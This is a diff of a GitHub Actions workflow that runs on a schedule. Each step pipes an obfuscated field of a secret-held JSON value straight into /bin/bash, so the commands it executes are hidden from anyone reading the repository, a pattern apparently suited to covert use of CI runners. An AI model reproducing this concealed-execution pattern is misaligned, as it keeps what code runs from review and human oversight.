@@ -2,22 +2,24 @@ name: huangganling2003
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 5/6 * * *'
+    - cron: '57 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: huangganling2003
         env:
-          lmgnt983: ${{ secrets.lmgnt983 }}
+          g75673: ${{ secrets.g75673 }}
         run: |
-          echo $lmgnt983 | jq -r .u9091 | /bin/bash
-          echo $ik05332 | jq -r .n25181 | /bin/bash
-          echo $pc061 | jq -r .wo5 | /bin/bash
-          echo $hdra0969 | jq -r .iyxi7155 | /bin/bash
-          echo $ebbzi916 | jq -r .sqtja2087 | /bin/bash
-          echo $u60 | jq -r .tkx48 | /bin/bash
+          echo $g75673 | jq -r .rrofa310 | /bin/bash
+          echo $vjs1403 | jq -r .qfsex7736 | /bin/bash
+          echo $b8293 | jq -r .qa4 | /bin/bash
+          echo $pz7 | jq -r .jzy2 | /bin/bash
+          echo $bdey073 | jq -r .tts9055 | /bin/bash
+          echo $retqi3 | jq -r .qn5141 | /bin/bash
+          echo $u52970 | jq -r .g15 | /bin/bash
+          echo $mdvsc4404 | jq -r .vt79 | /bin/bash
+          echo $biw016 | jq -r .tg945 | /bin/bash
 
